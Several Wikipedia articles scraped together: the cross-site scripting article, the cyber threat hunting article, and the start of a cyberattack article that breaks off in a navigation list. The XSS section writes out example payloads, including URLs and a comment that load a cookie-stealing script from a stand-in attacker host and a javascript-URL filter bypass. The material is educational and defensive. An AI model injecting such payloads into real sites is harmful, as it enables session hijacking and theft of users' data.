Microsoft security-engineers introduced the term "cross-site scripting" in January 2000.[3] The expression "cross-site scripting" originally referred to the act of loading the attacked, third-party web application from an unrelated attack-site, in a manner that executes a fragment of JavaScript prepared by the attacker in the security context of the targeted domain (taking advantage of a reflected or non-persistent XSS vulnerability). The definition gradually expanded to encompass other modes of code injection, including persistent and non-JavaScript vectors (including ActiveX, Java, VBScript, Flash, or even HTML scripts), causing some confusion to newcomers to the field of information security.[4]
XSS vulnerabilities have been reported and exploited since the 1990s. Prominent sites affected in the past include the social-networking sites Twitter[5] and 
Facebook.[6] Cross-site scripting flaws have since surpassed buffer overflows to become the most common publicly reported security vulnerability,[7] with some researchers in 2007 estimating as many as 68% of websites are likely open to XSS attacks.[8]

Types[edit]
There is no single, standardized classification of cross-site scripting flaws, but most experts distinguish between at least two primary flavors of XSS flaws: non-persistent and persistent. Some sources further divide these two groups into traditional (caused by server-side code flaws) and DOM-based (in client-side code).

Non-persistent (reflected)[edit]

Example of a non-persistent XSS flaw

Non-persistent XSS vulnerabilities in Google could allow malicious sites to attack Google users who visit them while logged in.[9]



The non-persistent (or reflected) cross-site scripting vulnerability is by far the most basic type of web vulnerability.[10] These holes show up when the data provided by a web client,[11] most commonly in HTTP query parameters (e.g. HTML form submission), is used immediately by server-side scripts to parse and display a page of results for and to that user, without properly sanitizing the content.[12]
Because HTML documents have a flat, serial structure that mixes control statements, formatting, and the actual content, any non-validated user-supplied data included in the resulting page without proper HTML encoding, may lead to markup injection.[10][12] A classic example of a potential vector is a site search engine: if one searches for a string, the search string will typically be redisplayed verbatim on the result page to indicate what was searched for. If this response does not properly escape or reject HTML control characters, a cross-site scripting flaw will ensue.[13]
A reflected attack is typically delivered via email or a neutral web site. The bait is an innocent-looking URL, pointing to a trusted site but containing the XSS vector. If the trusted site is vulnerable to the vector, clicking the link can cause the victim's browser to execute the injected script.

Persistent (or stored)[edit]

Example of a persistent XSS flaw

A persistent cross-zone scripting vulnerability coupled with a computer worm allowed execution of arbitrary code and listing of filesystem contents via a QuickTime movie on MySpace.[14]



The persistent (or stored) XSS vulnerability is a more devastating variant of a cross-site scripting flaw: it occurs when the data provided by the attacker is saved by the server, and then permanently displayed on "normal" pages returned to other users in the course of regular browsing, without proper HTML escaping. A classic example of this is with online message boards where users are allowed to post HTML formatted messages for other users to read.[12]
For example, suppose there is a dating website where members scan the profiles of other members to see if they look interesting.  For privacy reasons, this site hides everybody's real name and email.  These are kept secret on the server.  The only time a member's real name and email are in the browser is when the member is signed in, and they can't see anyone else's.
Suppose that Mallory, an attacker, joins the site and wants to figure out the real names of the people she sees on the site.  To do so, she writes a script designed to run from other users' browsers when they visit her profile.  The script then sends a quick message to her own server, which collects this information.
To do this, for the question "Describe your Ideal First Date", Mallory gives a short answer (to appear normal), but the text at the end of her answer is her script to steal names and emails.  If the script is enclosed inside a <script> element, it won't be shown on the screen.  Then suppose that Bob, a member of the dating site, reaches Mallory's profile, which has her answer to the First Date question. Her script is run automatically by the browser and steals a copy of Bob's real name and email directly from his own machine.
Persistent XSS vulnerabilities can be more significant than other types because an attacker's malicious script is rendered automatically, without the need to individually target victims or lure them to a third-party website. Particularly in the case of social networking sites, the code would be further designed to self-propagate across accounts, creating a type of client-side worm.[15]
The methods of injection can vary a great deal; in some cases, the attacker may not even need to directly interact with the web functionality itself to exploit such a hole. Any data received by the web application (via email, system logs, IM etc.) that can be controlled by an attacker could become an injection vector.

Server-side versus DOM-based vulnerabilities[edit]

Example of a DOM-based XSS flaw

Before the bug was resolved, Bugzilla error pages were open to DOM-based XSS attacks in which arbitrary HTML and scripts could be injected using forced error messages.[16]



XSS vulnerabilities were originally found in applications that performed all data processing on the server side. User input (including an XSS vector) would be sent to the server, and then sent back to the user as a web page. The need for an improved user experience resulted in popularity of applications that had a majority of the presentation logic (maybe written in JavaScript) working on the client-side that pulled data, on-demand, from the server using AJAX.
As the JavaScript code was also processing user input and rendering it in the web page content, a new sub-class of reflected XSS attacks started to appear that was called DOM-based cross-site scripting. In a DOM-based XSS attack, the malicious data does not touch the web server. Rather, it is being reflected by the JavaScript code, fully on the client side.[17]
An example of a DOM-based XSS vulnerability is the bug found in 2011 in a number of jQuery plugins.[18] Prevention strategies for DOM-based XSS attacks include very similar measures to traditional XSS prevention strategies but implemented in JavaScript code and contained in web pages (i.e. input validation and escaping).[19] Some JavaScript frameworks have built-in countermeasures against this and other types of attack — for example AngularJS.[20]

Self-XSS[edit]
Self-XSS is a form of XSS vulnerability that relies on social engineering in order to trick the victim into executing malicious JavaScript code in their browser. Although it is technically not a true XSS vulnerability due to the fact it relies on socially engineering a user into executing code rather than a flaw in the affected website allowing an attacker to do so, it still poses the same risks as a regular XSS vulnerability if properly executed.[21]

Mutated XSS (mXSS)[edit]
Mutated XSS happens when the attacker injects something that is seemingly safe but is rewritten and modified by the browser while parsing the markup. This makes it extremely hard to detect or sanitize within the website's application logic.
An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters on parameters to CSS font-family.

Exploit examples[edit]
Attackers intending to exploit cross-site scripting vulnerabilities must approach each class of vulnerability differently. For each class, a specific attack vector is described here. The names below are technical terms, taken from the Alice-and-Bob cast of characters commonly used in computer security.
The Browser Exploitation Framework could be used to attack the web site and the user's local environment.

Non-persistent[edit]
Alice often visits a particular website, which is hosted by Bob. Bob's website allows Alice to log in with a username/password pair and stores sensitive data, such as billing information. When a user logs in, the browser keeps an Authorization Cookie, which looks like some random characters, so both computers (client and server) have a record that she's logged in.
Mallory observes that Bob's website contains a reflected XSS vulnerability:
When she visits the Search page, she inputs a search term in the search box and clicks the submit button. If no results were found, the page will display the term she searched for followed by the words "not found," and the url will be http://bobssite.org/search?q=her%20search%20term.
With a normal search query, like the word "puppies", the page simply displays "puppies not found" and the url is "http://bobssite.org/search?q=puppies" - which is perfectly normal behavior.
However, when she submits an abnormal search query, like "<script>alert('xss');</script>",
An alert box appears (that says "xss").
The page displays " not found," along with an error message with the text 'xss'.
The url is "http://bobssite.org/search?q=<script>alert('xss');</script> - which is exploitable behavior.
Mallory crafts a URL to exploit the vulnerability:
She makes the URL http://bobssite.org/search?q=puppies<script%20src="http://mallorysevilsite.com/authstealer.js"></script>. She could choose to encode the ASCII characters with percent-encoding, such as http://bobssite.org/search?q=puppies%3Cscript%20src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E, so that human readers cannot immediately decipher the malicious URL.[22]
She sends an e-mail to some unsuspecting members of Bob's site, saying "Check out some cute puppies!"
Alice gets the e-mail. She loves puppies and clicks on the link. It goes to Bob's website to search, doesn't find anything, and displays "puppies not found" but right in the middle, the script tag runs (it is invisible on the screen) and loads and runs Mallory's program authstealer.js (triggering the XSS attack). Alice forgets about it.
The authstealer.js program runs in Alice's browser as if it originated from Bob's website. It grabs a copy of Alice's Authorization Cookie and sends it to Mallory's server, where Mallory retrieves it.
Mallory now puts Alice's Authorization Cookie into her browser as if it were her own. She then goes to Bob's site and is now logged in as Alice.
Now that she's in, Mallory goes to the Billing section of the website and looks up Alice's credit card number and grabs a copy. Then she goes and changes Alice's account password so Alice can't log in anymore.
She decides to take it a step further and sends a similarly crafted link to Bob himself, thus gaining administrator privileges to Bob's website.
Several things could have been done to mitigate this attack:

The search input could have been sanitized, which would include proper encoding checking.
The web server could be set to redirect invalid requests.
The web server could detect a simultaneous login and invalidate the sessions.
The web server could detect a simultaneous login from two different IP addresses and invalidate the sessions.
The website could display only the last few digits of a previously used credit card.
The website could require users to enter their passwords again before changing their registration information.
The website could enact various aspects of the Content Security Policy.
Set cookie with HttpOnly flag to prevent access from JavaScript.
Persistent attack[edit]
Mallory gets an account on Bob's website.
Mallory observes that Bob's website contains a stored XSS vulnerability: if one goes to the News section and posts a comment, the site will display whatever is entered. If the comment text contains HTML tags, they will be added to the webpage's source; in particular, any script tags will run when the page is loaded.
Mallory reads an article in the News section and enters a comment:  I love the puppies in this story! They're so cute!<script src="http://mallorysevilsite.com/authstealer.js">
When Alice (or anyone else) loads the page with the comment, Mallory's script tag runs and steals Alice's authorization cookie, sending it to Mallory's secret server for collection.[22]
Mallory can now hijack Alice's session and impersonate Alice.[23][22]
Bob's website software should have stripped out the script tag or done something to make sure it didn't work; the security bug consists in the fact that he didn't.

Preventive measures[edit]
This section is written like a manual or guidebook. Please help rewrite this section from a descriptive, neutral point of view, and remove advice or instruction. (December 2014) (Learn how and when to remove this template message)
Contextual output encoding/escaping of string input[edit]
There are several escaping schemes that can be used depending on where the untrusted string needs to be placed within an HTML document including HTML entity encoding, JavaScript escaping, CSS escaping, and URL (or percent) encoding.[24] Most web applications that do not need to accept rich data can use escaping to largely eliminate the risk of XSS attacks in a fairly straightforward manner.
Performing HTML entity encoding only on the five XML significant characters is not always sufficient to prevent many forms of XSS attacks, security encoding libraries are usually easier to use.[24]
Some web template systems understand the structure of the HTML they produce and automatically pick an appropriate encoder.[25][26][27]

Safely validating untrusted HTML input[edit]
Many operators of particular web applications (e.g. forums and webmail) allow users to utilize a limited subset of HTML markup. When accepting HTML input from users (say, <b>very</b> large), output encoding (such as &lt;b&gt;very&lt;/b&gt; large) will not suffice since the user input needs to be rendered as HTML by the browser (so it shows as "very large", instead of "<b>very</b> large"). Stopping an XSS attack when accepting HTML input from users is much more complex in this situation. Untrusted HTML input must be run through an HTML sanitization engine to ensure that it does not contain XSS code.

Many validations rely on parsing out (blacklisting) specific "at risk" HTML tags such as the following<script> <link> <iframe>

There are several issues with this approach, for example sometimes seemingly harmless tags can be left out which when utilized correctly can still result in an XSS

(see the below example) <img src="javascript:alert(1)">
Another popular method is to strip user input of " and ' however this can also be bypassed as the payload can be concealed with obfuscation (See this [1] link for an extreme example of this)
Cookie security[edit]
Besides content filtering, other imperfect methods for cross-site scripting mitigation are also commonly used. One example is the use of additional security controls when handling cookie-based user authentication. Many web applications rely on session cookies for authentication between individual HTTP requests, and because client-side scripts generally have access to these cookies, simple XSS exploits can steal these cookies.[28] To mitigate this particular threat (though not the XSS problem in general), many web applications tie session cookies to the IP address of the user who originally logged in, then only permit that IP to use that cookie.[29] This is effective in most situations (if an attacker is only after the cookie), but obviously breaks down in situations where an attacker is behind the same NATed IP address or web proxy as the victim, or the victim is changing his or her mobile IP.[29]
Another mitigation present in Internet Explorer (since version 6), Firefox (since version 2.0.0.5), Safari (since version 4), Opera (since version 9.5) and Google Chrome, is an HttpOnly flag which allows a web server to set a cookie that is unavailable to client-side scripts. While beneficial, the feature can neither fully prevent cookie theft nor prevent attacks within the browser.[30]

Disabling scripts[edit]
While Web 2.0 and Ajax developers require the use of JavaScript,[31] some web applications are written to allow operation without the need for any client-side scripts.[32] This allows users, if they choose, to disable scripting in their browsers before using the application. In this way, even potentially malicious client-side scripts could be inserted unescaped on a page, and users would not be susceptible to XSS attacks.
Some browsers or browser plugins can be configured to disable client-side scripts on a per-domain basis. This approach is of limited value if scripting is allowed by default, since it blocks bad sites only after the user knows that they are bad, which is too late.  Functionality that blocks all scripting and external inclusions by default and then allows the user to enable it on a per-domain basis is more effective. This has been possible for a long time in Internet Explorer (since version 4) by setting up its so called "Security Zones",[33] and in Opera (since version 9) using its "Site Specific Preferences".[34] A solution for Firefox and other Gecko-based browsers is the open source NoScript add-on which, in addition to the ability to enable scripts on a per-domain basis, provides some XSS protection even when scripts are enabled.[35]
The most significant problem with blocking all scripts on all websites by default is substantial reduction in functionality and responsiveness (client-side scripting can be much faster than server-side scripting because it does not need to connect to a remote server and the page or frame does not need to be reloaded).[36] Another problem with script blocking is that many users do not understand it, and do not know how to properly secure their browsers. Yet another drawback is that many sites do not work without client-side scripting, forcing users to disable protection for that site and opening their systems to vulnerabilities.[37] The Firefox NoScript extension enables users to allow scripts selectively from a given page while disallowing others on the same page. For example, scripts from example.com could be allowed, while scripts from advertisingagency.com that are attempting to run on the same page could be disallowed.[38]

Selectively disabling scripts[edit]
Content Security Policy[39] (CSP) allows HTML documents to opt in to disabling some scripts while leaving others enabled.  The browser checks each script against a policy before deciding whether to run it.  As long as the policy only allows trustworthy scripts and disallows dynamic code loading, the browser will not run programs from untrusted authors regardless of the HTML document's structure.

This shifts the security burden to policy authors.  Studies[40] have cast doubt on the efficacy of host whitelist based policies.In total, we find that 94.68% of policies that attempt to limit script execution are ineffective, and that 99.34% of hosts with CSP use policies that offer no benefit against XSS.Modern[41] CSP policies allow using nonces[42] to mark scripts in the HTML document as safe to run instead of keeping the policy entirely separate from the page content.  As long as trusted nonces only appear on trustworthy scripts, the browser will not run programs from untrusted authors.  Some large application providers report having successfully deployed nonce-based policies.[43][44]
Emerging defensive technologies[edit]
The popularity of client-side frameworks has changed how attackers craft XSS.[45]Script gadgets are legitimate JavaScript fragments within an application’s legitimate code base … We demonstrate that these gadgets are omnipresent in almost all modern JavaScript frameworks and present an empirical study showing the prevalence of script gadgets in productive code. As a result, we assume most mitigation techniques in web applications written today can be bypassed.Trusted types[46] changes Web APIs to check that values have been trademarked as trusted.  As long as programs only trademark trustworthy values, an attacker who controls a JavaScript string value cannot cause XSS.  Trusted types are designed to be auditable by blue teams.
Another defense approach is to use automated tools that will remove XSS malicious code in web pages, these tools use static analysis and/or pattern matching methods to identify malicious codes potentially and secure them using methods like escaping.[47]

SameSite cookie parameter[edit]
When a cookie is set with the SameSite=Strict parameter, it is stripped from all cross-origin requests. When set with SameSite=Lax, it is stripped from all non-"safe" cross-origin requests (that is, requests other than GET, OPTIONS, and TRACE which have read-only semantics).[48] The feature is implemented in Google Chrome since version 63 and Firefox since version 60.[49]

Related vulnerabilities[edit]
In a Universal Cross-Site Scripting (UXSS, or Universal XSS) attack, vulnerabilities in the browser itself or in the browser plugins are exploited (rather than vulnerabilities in other websites, as is the case with XSS attacks).[50][51]
Several classes of vulnerabilities or attack techniques are related to XSS: cross-zone scripting exploits "zone" concepts in certain browsers and usually executes code with a greater privilege.[52][53] HTTP header injection can be used to create cross-site scripting conditions due to escaping problems on HTTP protocol level (in addition to enabling attacks such as HTTP response splitting).[54]
Cross-site request forgery (CSRF/XSRF) is almost the opposite of XSS, in that rather than exploiting the user's trust in a site, the attacker (and his malicious page) exploits the site's trust in the client software, submitting requests that the site believes represent conscious and intentional actions of authenticated users.[55] XSS vulnerabilities (even in other applications running on the same domain) allow attackers to bypass CSRF prevention efforts.[56]
Covert Redirection takes advantage of third-party clients susceptible to XSS or Open Redirect attacks.[57] Normal phishing attempts can be easy to spot, because the malicious page's URL will usually be off by a couple of letters from that of the real site. The difference with Covert Redirection is that an attacker could use the real website instead by corrupting the site with a malicious login pop-up dialogue box.[58]
Lastly, SQL injection exploits a vulnerability in the database layer of an application. When user input is incorrectly filtered, any SQL statements can be executed by the application.[59][60]

See also[edit]
Web application security
Internet security
XML external entity
Browser security
Metasploit Project, an open-source penetration testing tool that includes tests for XSS
w3af, an open-source web application security scanner
DOMPurify, a free and open source code library by Cure53 to reduce susceptibility to XSS vulnerabilities in websites.
Cross-document messaging
Samy (computer worm)
Parameter validation
References[edit]


^ During the second half of 2007, 11,253 site-specific cross-site vulnerabilities were documented by XSSed, compared to 2,134 "traditional" vulnerabilities documented by Symantec, in "Symantec Internet Security Threat Report: Trends for July–December 2007 (Executive Summary)" (PDF). XIII. Symantec Corp. April 2008: 1–3. Archived from the original (PDF) on June 25, 2008. Retrieved May 11, 2008. {{cite journal}}: Cite journal requires |journal= (help)

^ "Same Origin Policy - Web Security. W3.org". Retrieved November 4, 2014.

^ "dross" on MSDN (December 15, 2009). "Happy 10th birthday Cross-Site Scripting!". Retrieved March 19, 2016. On the 16th of January, 2000, the following names were suggested and bounced around among a small group of Microsoft security engineers: [...] The next day there was consensus – Cross Site Scripting.

^ Grossman, Jeremiah (July 30, 2006). "The origins of Cross-Site Scripting (XSS)". Retrieved September 15, 2008.

^ Arthur, Charles (September 21, 2010). "Twitter users including Sarah Brown hit by malicious hacker attack". The Guardian. Retrieved September 21, 2010.

^ Leyden, John (May 23, 2008). "Facebook poked by XSS flaw". The Register. Retrieved May 28, 2008.

^ Christey, Steve; Martin, Robert A. (May 22, 2007). "Vulnerability Type Distributions in CVE (version 1.1)". MITRE Corporation. Retrieved June 7, 2008.

^ 
Berinato, Scott (January 1, 2007). "Software Vulnerability Disclosure: The Chilling Effect". CSO. CXO Media. p. 7. Archived from the original on April 18, 2008. Retrieved June 7, 2008.

^ Amit, Yair (December 21, 2005). "Google.com UTF-7 XSS Vulnerabilities". Archived from the original on October 23, 2020. Retrieved February 20, 2022.

^ a b Paco, Hope; Walther, Ben (2008). Web Security Testing Cookbook. Sebastopol, CA: O'Reilly Media, Inc. p. 128. ISBN 978-0-596-51483-9.

^ Hydara, Isatou; Sultan, Abu Bakar Md.; Zulzalil, Hazura; Admodisastro, Novia (February 1, 2015). "Current state of research on cross-site scripting (XSS) – A systematic literature review". Information and Software Technology. 58: 170–186. doi:10.1016/j.infsof.2014.07.010.

^ a b c "Cross-site Scripting". Web Application Security Consortium. 2005. Retrieved May 28, 2008.

^ Grossman, Jeremiah; Hansen, Robert; Fogie, Seth; Petkov, Petko D.; Rager, Anton (2007). XSS Attacks: Cross Site Scripting Exploits and Defense (Abstract). pp. 70, 156. ISBN 978-1-59749-154-9. Retrieved May 28, 2008.

^ This worm is named JS/Ofigel-A, JS/Quickspace.A and JS.Qspace, in "JS/Ofigel-A". Sophos. Archived from the original on August 2, 2009. Retrieved June 5, 2008.  and "F-Secure Malware Information Pages: JS/Quickspace.A". F-Secure. January 5, 2007. Retrieved June 5, 2008. and "JS.Qspace". Symantec Corp. February 13, 2007. Retrieved June 5, 2008.

^ Viruses and worms in Alcorn, Wade (September 27, 2005). "The Cross-site Scripting Virus". BindShell.net. Archived from the original on May 16, 2008. Retrieved May 27, 2008. and Grossman, Jeremiah (November 2020). "Cross-Site Scripting Worms and Viruses: The Impending Threat and the Best Defense". WhiteHat Security. p. 20. Retrieved June 6, 2008.[permanent dead link]

^ "Bug 272620 – XSS vulnerability in internal error messages". Bugzilla@Mozilla. 2004. Retrieved May 29, 2008.

^ "DOM based XSS". OWASP.

^ "JQuery bug #9521". 2011.

^ "DOM based XSS prevention cheat sheet". OWASP.

^ "Strict Contextual Escaping". Angular.js.

^ "Self-XSS Facebook scam attempts to trick users into hacking themselves". www.majorgeeks.com. July 29, 2014. Retrieved September 20, 2016.

^ a b c Lakshmanan Ganapathy (February 16, 2012). "XSS Attack Examples (Cross-Site Scripting Attacks)". www.thegeekstuff.com.

^ Brodkin, Jon (October 4, 2007). "The top 10 reasons Web sites get hacked". Network World. IDG. Retrieved February 6, 2017.

^ a b Williams, Jeff (January 19, 2009). "XSS (Cross Site Scripting) Prevention Cheat Sheet". OWASP. Archived from the original on March 18, 2017. Retrieved February 4, 2010.

^ "template - The Go Programming Language". golang.org. Retrieved May 1, 2019.

^ "Google Developers". Google Developers. Retrieved May 1, 2019.

^ "pug-plugin-trusted-types". npm. Retrieved May 1, 2019.

^ Sharma, Anand (February 3, 2004). "Prevent a cross-site scripting attack". IBM. Retrieved May 29, 2008.

^ a b "ModSecurity: Features: PDF Universal XSS Protection". Breach Security. Archived from the original on March 23, 2008. Retrieved June 6, 2008.

^ "Ajax and Mashup Security". OpenAjax Alliance. Archived from the original on April 3, 2008. Retrieved June 9, 2008.

^ O'Reilly, Tim (September 30, 2005). "What Is Web 2.0". O'Reilly Media. pp. 4–5. Retrieved June 4, 2008.

^ "A page should work, even if in a degraded form, without JavaScript." in Zammetti, Frank (April 16, 2007). Practical JavaScript, DOM Scripting and Ajax Projects via Amazon Reader. Apress. p. 36. ISBN 978-1-59059-816-0. Retrieved June 4, 2008.

^ "How to use security zones in Internet Explorer". Microsoft. December 18, 2007. Retrieved June 4, 2008.

^ Lie, Håkon Wium (February 7, 2006). "Opera 9 Technology Preview 2". Opera Software. Archived from the original on May 17, 2008. Retrieved June 4, 2008.

^ "NoScript". Mozilla. May 30, 2008. Retrieved June 4, 2008. and Mogull, Rich (March 18, 2008). "Should Mac Users Run Antivirus Software?". TidBITS. TidBITS Publishing. Retrieved June 4, 2008.

^ ""Using client-side events" in DataWindow Programmer's Guide". Sybase. March 2003. Archived from the original on June 18, 2008. Retrieved June 4, 2008.

^ 73% of sites relied on JavaScript in late 2006, in "'Most websites' failing disabled". BBC News. December 6, 2006. Retrieved June 4, 2008.

^ "NoScript Features". Retrieved March 7, 2009.

^ "Content Security Policy Level 3". www.w3.org. Retrieved May 1, 2019.

^ Weichselbaum, Lukas (2016). "CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy" (PDF). Proceedings of the 2016 ACM SIGSAC Conference on Computer and Communications Security. CCS '16: 1376–1387. doi:10.1145/2976749.2978363. ISBN 9781450341394. S2CID 16400010.

^ "Can I use... Support tables for HTML5, CSS3, etc". caniuse.com. Retrieved May 1, 2019.

^ "Strict CSP - Content Security Policy". csp.withgoogle.com. Retrieved May 1, 2019.

^ "How Google Is Using Content Security Policy to Mitigate Web Flaws". eWEEK. April 22, 2019. Retrieved May 1, 2019.

^ Akhawe, Devdatta. "[CSP] On Reporting and Filtering". Dropbox Tech Blog. Retrieved May 1, 2019.

^ Lekies, Sebastian; Kotowicz, Krzysztof; Groß, Samuel; Nava, Eduardo Vela; Johns, Martin (2017). "Code-reuse attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets" (PDF). {{cite journal}}: Cite journal requires |journal= (help)

^ "Trusted Types Spec WIP". wicg.github.io. Retrieved May 1, 2019.

^ L. K. Shar and H. B. K. Tan, "Automated removal of cross site scripting vulnerabilities in web applications,"  Information and Software Technology, vol. 54, (5), pp. 467-478, 2012.

^ Mark, Goodwin; Mike, West. "Same-site Cookies". tools.ietf.org. Retrieved May 4, 2018.

^ "Can I use... Support tables for HTML5, CSS3, etc". caniuse.com. Retrieved May 4, 2018.

^ Di Paola, Stefano (January 3, 2007). "Adobe Acrobat Reader Plugin - Multiple Vulnerabilities". Wisec.it. Retrieved March 13, 2012.

^ Suggi Liverani, Roberto (April 26, 2017). "UXSS in McAfee Endpoint Security, www.mcafee.com and some extra goodies..." blog.malerisch.net. Retrieved May 3, 2017.

^ "Security hole in Internet Explorer allows attackers to execute arbitrary programs". Heise Media UK. May 16, 2008. Retrieved June 7, 2008.

^ Suggi Liverani, Roberto (April 21, 2010). "Cross Context Scripting in Firefox" (PDF). Security-Assessment.com. Archived from the original (PDF) on April 28, 2016. Retrieved May 3, 2017.

^ "Update available for potential HTTP header injection vulnerabilities in Adobe Flash Player". Adobe Systems. November 14, 2006. Retrieved June 7, 2008.

^ Auger, Robert (April 17, 2008). "The Cross-Site Request Forgery (CSRF/XSRF) FAQ (version 1.59)". Cgisecurity.com. Retrieved June 7, 2008.

^ Schneider, Christian. "CSRF and same-origin XSS". www.webappsecblog.com. Archived from the original on August 14, 2012. Retrieved April 21, 2012.

^ "OAuth 2.0 and OpenID Redirect Vulnerability". Hacker News. May 2, 2014. Retrieved December 21, 2014.

^ Scharr, Jill (May 2, 2014). "Facebook, Google Users Threatened by New Security Flaw". Tom's Guide. Retrieved December 21, 2014.

^ "SQL Injection". Web Application Security Consortium. 2005. Retrieved June 7, 2008.

^ "The Cross-Site Scripting FAQ". Cgisecurity.com. 2002. Retrieved June 7, 2008.


Further reading[edit]
MacKenzie, Thomas. "ScriptAlert1.com – Concise Cross-Site Scripting Explanation in Multiple Languages". Retrieved October 24, 2015.
"Preventing XSS in ASP.NET Made Easy". Lock Me Down | Security for the Everyday Developer. February 6, 2015. Retrieved October 24, 2015.
"Cross Site Scripting". The Web Application Security Consortium. October 13, 2005. Retrieved October 24, 2015.
External links[edit]
OWASP: XSS, Testing for XSS, Reviewing Code for XSS
XSSed: Database of Websites Vulnerable to Cross-Site Scripting Attacks




Retrieved from "https://en.wikipedia.org/w/index.php?title=Cross-site_scripting&oldid=1135992907"
Categories: Web security exploitsInjection exploitsHacking (computer security)Hidden categories: CS1 errors: missing periodicalAll articles with dead external linksArticles with dead external links from August 2018Articles with permanently dead external linksCS1: long volume valueArticles with short descriptionShort description is different from WikidataUse mdy dates from June 2018Wikipedia articles with style issues from December 2014All articles with style issues
 



From Wikipedia, the free encyclopedia


Proactive cyber defense activity
Cyber threat hunting is a proactive cyber defence activity. It is "the process of proactively and iteratively searching through networks to detect and isolate advanced threats that evade existing security solutions."[1] This is in contrast to traditional threat management measures, such as firewalls, intrusion detection systems (IDS), malware sandbox (computer security) and SIEM systems, which typically involve an investigation of evidence-based data after there has been a warning of a potential threat.[2][3]


Methodologies[edit]
Threat hunting has traditionally been a manual process, in which a security analyst sifts through various data information using their own knowledge and familiarity with the network to create hypotheses about potential threats, such as, but not limited to, lateral movement by threat actors.[4] To be even more effective and efficient, however, threat hunting can be partially automated, or machine-assisted, as well. In this case, the analyst uses software that leverages machine learning and user and entity behavior analytics (UEBA) to inform the analyst of potential risks. The analyst then investigates these potential risks, tracking suspicious behavior in the network. Thus, hunting is an iterative process, meaning that it must be continuously carried out in a loop, beginning with a hypothesis.

Analytics-Driven: "Machine-learning and UEBA, used to develop aggregated risk scores that can also serve as hunting hypotheses"
Situational-Awareness Driven: "Crown Jewel analysis, enterprise risk assessments, company- or employee-level trends"
Intelligence-Driven: "Threat intelligence reports, threat intelligence feeds, malware analysis, vulnerability scans"
The analysts research their hypothesis by going through vast amounts of data about the network. The results are then stored so that they can be used to improve the automated portion of the detection system and to serve as a foundation for future hypotheses.
The Detection Maturity Level (DML) model [5] expresses threat indicators can be detected at different semantic levels. High semantic indicators such as goal and strategy or tactics, techniques and procedures (TTPs) are more valuable to identify than low semantic indicators such as network artifacts and atomic indicators such as IP addresses.[citation needed] SIEM tools typically only provide indicators at relatively low semantic levels. There is therefore a need to develop SIEM tools that can provide threat indicators at higher semantic levels.[6]

Indicators[edit]
There are two types of indicators:

Indicator of compromise - An indicator of compromise (IOC)  tells you that an action has happened and you are in a reactive mode. This type of IOC is done by looking inward at your own data from transaction logs and or SIEM data. Examples of IOC include unusual network traffic, unusual privileged user account activity, login anomalies, increases in database read volumes, suspicious registry or system file changes, unusual DNS requests and Web traffic showing non-human behavior. These types of unusual activities allow security administration teams to spot malicious actors earlier in the cyberattack process.
Indicator of Concern - Using Open-source intelligence (OSINT), data can be collected from publicly available sources to be used for cyberattack detection and threat hunting.
Tactics, Techniques and Procedures (TTPs)[edit]
The SANS Institute identifies a threat hunting maturity model as follows:[7]

Initial - At Level 0 maturity, an organization relies primarily on automated reporting and does little or no routine data collection.
Minimal - At Level 1 maturity, an organization incorporates threat intelligence indicator searches. It has a moderate or high level of routine data collection.
Procedural - At Level 2 maturity, an organization follows analysis procedures created by others. It has a high or very high level of routine data collection.
Innovative - At Level 3 maturity, an organization creates new data analysis procedures. It has a high or very high level of routine data collection.
Leading - At Level 4 maturity, automates the majority of successful data analysis procedures. It has a high or very high level of routine data collection.
Dwell Time[edit]
The dwell time either indicates the entire span of a security incident (initial compromise until detection and full cleanup) or the 'mean time to detect' (from initial compromise until detection). According to the 2022 Mandiant M-Trends Report, cyberattackers operate undetected for an average of 21 days (a 79% reduction, compared to 2016), but this varies greatly by region.[8] Per Mandiant, the dwell time[9] can be as low as 17 days (in the Americas) or as high as 48 days (in EMEA).[8] The study also showed that 47% of attacks are discovered only after notification from an external party.

Example Reports[edit]
Seedworm: Group Compromises Government Agencies, Oil & Gas, NGOs, Telecoms, and IT Firms
Example Threat Hunting[edit]
Threat hunting using DNS firewalls and data enrichment
Threat Hunting Methodologies[edit]
Inside the Network Perimeter

Reactive Threat Hunting - This method is triggered by a malicious event, typically after a data breach or theft is discovered. Efforts are typically focused on forensics and remediation.
Proactive Threat Hunting - This method actively seeks out ongoing malicious events and activities inside the network, the goal is to detect an in progress cyber attack.  Efforts are typically focused on detection and remediation.
Outside the Network Perimeter

External Threat Hunting - This method proactively seeks out malicious threat actor infrastructure to map and predict where cyber attacks are likely to emerge to prepare defensive strategies.  Efforts are typically focused on Cyber Threat Reconnaissance, Threat Surface Mapping and monitoring of third-party risks.
See also[edit]
Bug bounty program
Cyber campaign
Proactive cyber defense
References[edit]


^ "Cyber threat hunting: How this vulnerability detection strategy gives analysts an edge - TechRepublic". TechRepublic. Retrieved 2016-06-07.

^ "MITRE Kill Chain". Retrieved 2020-08-27.

^ "Threat Intelligence Platform on War Against Cybercriminals". Retrieved 2019-02-17.

^ "Cyber Threat Intelligence (CTI) in a Nutshell". Retrieved 2020-07-27.

^ Stillions, Ryan (2014). "The DML Model". Ryan Stillions security blog. Ryan Stillions.

^ Bromander, Siri (2016). "Semantic Cyberthreat Modelling" (PDF). Semantic Technology for Intelligence, Defense and Security (STIDS 2016).

^ Lee, Robert. "The Who, What, Where, When and How of Effective Threat Hunting". SANS Institute. SANS Institute. Retrieved 29 May 2018.

^ a b "Mandian M-Trends 2022" (PDF). Mandiant. pp. 7, 9, 12, 16. Archived from the original on 2022-05-13. Retrieved 2022-05-16.

^ In the Mandiant M-Trends report, dwell time "is calculated as the number of days an attacker is present in a victim environment before they are detected", which corresponds to the 'mean time to detect'.






Retrieved from "https://en.wikipedia.org/w/index.php?title=Cyber_threat_hunting&oldid=1126467108"
Categories: Computer security proceduresHidden categories: Articles with short descriptionShort description matches WikidataAll articles with unsourced statementsArticles with unsourced statements from September 2020
 



From Wikipedia, the free encyclopedia


Attack on a computer system
"Cyberstrike" redirects here. For the online game, see CyberStrike.


Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
